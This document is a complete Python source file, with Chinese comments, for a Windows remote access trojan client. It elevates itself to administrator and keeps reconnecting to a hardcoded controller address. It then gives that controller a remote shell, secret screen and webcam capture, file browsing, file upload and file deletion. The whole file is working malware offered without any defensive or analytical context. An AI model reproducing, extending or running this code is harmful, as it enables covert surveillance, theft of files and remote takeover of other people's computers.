import socket
import time
import os
import subprocess
import cv2
import numpy as np
import io
import win32file
import win32api
import pickle
import ctypes
import sys
from PIL import ImageGrab

IP, PORT = '192.168.0.106', 8080

def is_admin():
    """检查是否拥有管理员权限"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    """以管理员权限重新启动当前程序（exe 或 .py）"""
    if getattr(sys, 'frozen', False):
        # 打包后的 exe 环境
        app_path = sys.executable
        cmd_args = sys.argv[1:]
    else:
        # 开发环境（.py）：需要把脚本路径也作为参数传给 python.exe
        app_path = sys.executable
        cmd_args = sys.argv  # sys.argv[0] 即 .py 脚本路径

    params = ' '.join([f'"{arg}"' if ' ' in arg else arg for arg in cmd_args])

    # 调用 Windows ShellExecuteW 请求提权
    ctypes.windll.shell32.ShellExecuteW(
        None,           # 父窗口句柄
        "runas",        # 动作：以管理员运行
        app_path,       # 要运行的程序路径
        params,         # 命令行参数
        None,           # 工作目录（默认当前）
        1               # 窗口状态（1 表示正常显示）
    )
    sys.exit()  # 退出当前未提权的进程

if not is_admin():
    run_as_admin()

while True:
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((IP, PORT))

        while True:
            # 只读1字节，防止与后续指令粘包
            choice_raw = client.recv(1)
            if not choice_raw: break
            choice = choice_raw.decode()

            # 模块1：Shell模式
            if choice == '1':
                while True:
                    cmd = client.recv(1024).decode()
                    if cmd == '0':
                        break
                    if cmd.startswith('cd '):
                        try:
                            os.chdir(cmd[3:].strip())
                            output = f"CWD: {os.getcwd()}"
                        except Exception as e: output = str(e)
                    else:
                        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, encoding='gbk')
                        output = (res.stdout + res.stderr) or '(无输出)'
                                
                    out_bytes = output.encode('gbk', errors='ignore')
                    client.sendall(f"{len(out_bytes):08d}".encode() + out_bytes)

            # 模块2：屏幕监控
            elif choice == '2':
                while True:
                    raw_data = client.recv(1024)
                    if not raw_data:
                        break
                    action = raw_data.decode().strip()
                    if action == 'stop':
                        break
                    elif action == 'get':
                        # 内存处理，不写硬盘
                        img = ImageGrab.grab()
                        img_byte_arr = io.BytesIO()
                        img.save(img_byte_arr, format='JPEG', quality=30)
                        data = img_byte_arr.getvalue()
                        client.sendall(f"{len(data):08d}".encode() + data)

            # 模块3：摄像头监控
            elif choice == '3':
                cap = None
                try:
                    if os.name == 'nt':
                        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                    else:
                        cap = cv2.VideoCapture(0)
                    
                    print(f"[*] 摄像头开启状态: {cap.isOpened()}")
                    
                    while True:
                        raw_data = client.recv(1024)
                        if not raw_data:
                            break
                            
                        action = raw_data.decode().strip()
                        if action == 'stop': 
                            break
                        elif action == 'get':
                            if cap.isOpened():
                                ret, frame = cap.read()
                                if ret:
                                    _, img_encode = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
                                    data = img_encode.tobytes()
                                else: 
                                    data = b''
                            else:
                                data = b''
                            client.sendall(f"{len(data):08d}".encode() + data)
                finally:
                    if cap is not None:
                        cap.release()
                    time.sleep(1)
            elif choice=='4':
                get_HD=win32api.GetLogicalDriveStrings()
                client.sendall(f"{len(get_HD):08d}".encode() + get_HD.encode())
                while True:
                    recv_sinter=client.recv(1024).decode().strip()
                    if recv_sinter == '0':
                        break
                    sinter_list=recv_sinter.split(maxsplit=1)
                    if not sinter_list:
                        continue
                    if sinter_list[0]=='look':
                        try:
                            files=win32file.listdir(sinter_list[1])
                            data=pickle.dumps(files)
                            client.sendall(f"{len(data):08d}".encode() + data)
                        except Exception as e:
                            client.sendall(f"{len(str(e)):08d}".encode() + str(e).encode())
                    elif sinter_list[0]=='get':
                        file_path=sinter_list[1]
                        try:
                            get_file_size=os.path.getsize(file_path)
                            client.sendall(f"{get_file_size:08d}".encode())
                            client.recv(1024)  # 等待服务端确认
                            with open(file_path,'rb') as f:
                                while True:
                                    chunk=f.read(4096)
                                    if not chunk:
                                        break
                                    client.sendall(chunk)
                        except Exception as e:
                            client.sendall(b"-0000001")  # 发送-1表示失败，区别于空文件
                    elif sinter_list[0]=='delete':
                        try:
                            os.remove(sinter_list[1])
                        except Exception:
                            pass


                    
    except Exception as e:
        time.sleep(5)
    finally:
        client.close()